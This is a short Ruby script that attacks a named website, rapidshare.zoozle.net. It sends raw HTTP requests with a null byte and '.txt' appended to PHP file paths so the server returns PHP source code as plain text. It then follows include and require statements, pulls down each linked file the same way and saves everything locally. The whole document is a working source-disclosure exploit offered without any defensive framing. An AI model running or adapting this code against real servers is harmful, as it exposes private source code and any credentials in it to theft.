require 'socket'

def getPage(host, page)
  request = "GET /#{page}\x00.txt HTTP/1.1\r\nHost: #{host}\r\n\r\n"

  sock = TCPSocket.open(host, 80)
  sock.write(request)
  response = sock.read

  headers,body = response.split("\r\n\r\n", 2)

  return body || nil
end

def getIncludes(body)
  lines = body.split("\r\n")
  
  files = []
  lines.each { |line|
    if(line =~ /include "([^\"]+)"/) 
      m = $1
      files << m unless m == nil
    end

    if(line =~ /include '([^\']+)'/) 
      m = $1
      files << m unless m == nil
    end

    if(line =~ /require('([^\']+)')/) 
      m = $1
      files << m.gsub("./","") unless m == nil
    end
  }
  return files
end

def savepage(filename, text)
  fd = File.new("rapidshare.zoozle/#{filename.gsub("/","___")}", "w")
  fd.puts(text)
  fd.close
  puts "Written #{filename} down by now!"
end

host = 'rapidshare.zoozle.net'
startpage = 'php/news.class.php'

text = getPage(host, startpage)
savepage(startpage, text)

pages = getIncludes(text)
pages.each { |x|
  body = getPage(host, x)
  savepage(x, body)
}
